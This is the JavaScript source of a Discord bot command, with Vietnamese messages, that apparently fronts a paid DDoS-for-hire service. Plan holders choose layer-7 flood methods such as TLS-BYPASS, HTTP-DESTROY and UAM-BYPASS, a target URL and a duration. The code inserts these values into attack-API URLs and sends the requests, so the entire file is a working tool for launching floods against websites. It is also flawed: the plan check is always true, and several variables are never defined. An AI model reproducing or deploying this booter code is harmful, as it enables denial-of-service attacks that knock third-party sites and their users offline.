const { SlashCommandBuilder, WebhookClient, EmbedBuilder } = require('discord.js');
var axios = require("axios");
const { attack_log, api_free_l7, api_vip_l7, api_admin_l7, block_host } = require('../../config.json');
const webhookURL = attack_log;
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('database.db');
const wait = require('node:timers/promises').setTimeout;

module.exports = {
   cooldown: 300,
   data: new SlashCommandBuilder()
      .setName('start-l7')
      .setDescription('đấm layer 7')
      .addStringOption(option => option.setName('methods').setDescription('methods đấm').setRequired(true).addChoices(
         { name: 'TLS-FLOOD', value: 'TLS-FLOOD' },
         { name: 'TLS-BYPASS', value: 'TLS-BYPASS' },
         { name: 'BROWSER', value: 'BROWSER' },
         { name: 'HTTP-RAW', value: 'HTTP-RAW' },
         { name: 'HTTP-LOAD', value: 'HTTP-LOAD' },
         { name: 'HTTP-DESTROY', value: 'HTTP-DESTROY' },
         { name: 'UAM-BYPASS', value: 'UAM-BYPASS' },
        // { name: 'FLOODER', value: 'FLOODER' },
        // { name: 'HTTPS-VIP', value: 'HTTPS-VIP' },
        // { name: 'DESTROY', value: 'DESTROY' },
        // { name: 'HTTPS-LOAD', value: 'https-load' },
        // { name: 'SLOW', value: 'slow' },
        // { name: 'OVH', value: 'ovh' },
        // { name: 'STORM-BYPASS', value: 'STORM-BYPASS' },
        // { name: 'HTTPS-DESTROY', value: 'HTTPS-DESTROY' },
      ))
      .addStringOption(option => option.setName('url').setDescription('ip server muốn đấm').setRequired(true))
      .addIntegerOption(option => option.setName('time').setDescription('thời gian đấm').setRequired(true)),
   async execute(interaction) {
      await interaction.deferReply({ ephemeral: true });
      await wait(1000)
      const userId = interaction.user.id;
      db.get('SELECT users_id, plan, exp, attack_time FROM users WHERE users_id = ?', [userId],async (err, row) => {
         if (err) {
           throw err; 
         }
         if (row) {
            if (`${row.plan}` === 'VIP', 'FREE', 'ADMIN') {
               const url = interaction.options.get('url').value;
               const time = interaction.options.get('time').value;
               const method = interaction.options.get('methods').value;
               const hostLink = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/;
               if (!hostLink.test(url)) {
                  await interaction.editReply('sai định dạng url');
                  return;
               }  
               if (block_host.some((word) => interaction.toString().toLowerCase().includes(word))) {
                  await interaction.editReply('ip nằm trong danh sách bị chặn');
               } else if (time > row.attack_time) { 
                  await interaction.editReply({ content: `thời gian phải nhỏ hơn hoặc bằng ${row.attack_time}`, ephemeral: true });
               } else {

                  const free = api_free_l7.replace('[url]', url).replace('[time]', time).replace('[method]', method);
                  const vip = api_vip_l7.replace('[url]', url).replace('[time]', time).replace('[method]', method);
                  const admin = api_admin_l7.replace('[url]', url).replace('[time]', time).replace('[method]', method);

                  const embed = new EmbedBuilder()
                  .setColor(color)
                  .setTitle(namebot)
                  .setDescription('```'+ `Attack Sent Check DMS` + '```')
                  .setTimestamp()
                  .setFooter({ text: 'Dev by ngọc(ALLEC_VN)', iconURL: `${admin_url}` });
                  await interaction.editReply({ embeds: [embed] , ephemeral: true });

                  const Embed = new EmbedBuilder()
                     .setColor(color)
                     .setTitle(namebot)
                     .setDescription('Type: layer7')
                     .addFields({ name: '`🧨 URL:`', value: `\`\`\`css\n[ ${url} ]\n\`\`\`` })
                     .addFields({ name: '`🕛 TIME:`', value: `\`\`\`css\n[ ${time} ]\n\`\`\`` })
                     .addFields({ name: '`🔰 METHOD:`', value: `\`\`\`css\n[ ${method} ]\n\`\`\`` })
                     .addFields({ name: '`💸 PLAN:`', value: `\`\`\`css\n[ ${row.plan} ]\n\`\`\`` })
                     .setImage(img_url)
                     .setTimestamp()
                     .setFooter({ text: 'Dev by ngọc(ALLEC_VN)', iconURL: `${admin_url}` });
                  await interaction.user.send({ embeds: [Embed], ephemeral: true });

                  if (row.plan == 'FREE') {
                     axios.get(free)
                     .then(async (response) => {
                        if (response.status === 200) {
                           console.log('[axios] Kết quả thành công:', response.data);
                        } else if (response.status === 429) {
                           console.log('[axios] err:', response.status);
                        } else {
                           console.log('[axios] timeout:', response.status);
                        }
                     }).catch(async (error) => {
                        console.error('[axios] Lỗi kết nối:', error.message);
                     });
                  }
                  if (row.plan == 'VIP') {
                     axios.get(vip)
                     .then(async (response) => {
                        if (response.status === 200) {
                           console.log('[axios] Kết quả thành công:', response.data);
                        } else if (response.status === 429) {
                           console.log('[axios] err:', response.status);
                        } else {
                           console.log('[axios] timeout:', response.status);
                        }
                     }).catch(async (error) => {
                        console.error('[axios] Lỗi kết nối:', error.message);
                     });
                  }
                  if (row.plan == 'ADMIN') {
                     axios.get(admin)
                     .then(async (response) => {
                        if (response.status === 200) {
                           console.log('[axios] Kết quả thành công:', response.data);
                        } else if (response.status === 429) {
                           console.log('[axios] err:', response.status);
                        } else {
                           console.log('[axios] timeout:', response.status);
                        }
                     }).catch(async (error) => {
                        console.error('[axios] Lỗi kết nối:', error.message);
                     });
                  }
               }
            }
         } else {
            await interaction.editReply('bạn ko có plan để sử dụng!');
         }
      });
   }
};